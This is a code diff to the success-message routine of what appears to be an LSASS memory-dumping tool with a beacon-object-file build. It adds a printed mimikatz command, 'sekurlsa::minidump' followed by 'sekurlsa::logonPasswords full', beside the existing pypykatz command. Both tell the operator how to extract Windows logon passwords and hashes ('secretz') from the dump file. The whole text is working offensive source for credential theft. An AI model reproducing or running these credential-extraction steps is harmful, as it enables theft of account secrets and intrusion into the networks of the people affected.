@@ -590,19 +590,22 @@ VOID print_success(
     {
 #ifdef BOF
         PRINT(
-            "Done, to download the dump run:\ndownload %s\nto get the secretz run:\npython3 -m pypykatz lsa minidump %s",
+            "Done, to download the dump run:\ndownload %s\nto get the secretz run:\npython3 -m pypykatz lsa minidump %s\nmimikatz.exe \"sekurlsa::minidump %s\" \"sekurlsa::logonPasswords full\" exit",
             dump_path,
+            strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path,
             strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path);
 #else
         PRINT(
-            "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s",
+            "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s\nmimikatz.exe \"sekurlsa::minidump %s\" \"sekurlsa::logonPasswords full\" exit",
+            strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path,
             strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path);
 #endif
     }
     else
     {
         PRINT(
-            "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s",
+            "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s\nmimikatz.exe \"sekurlsa::minidump %s\" \"sekurlsa::logonPasswords full\" exit",
+            dump_path,
             dump_path);
     }
 }
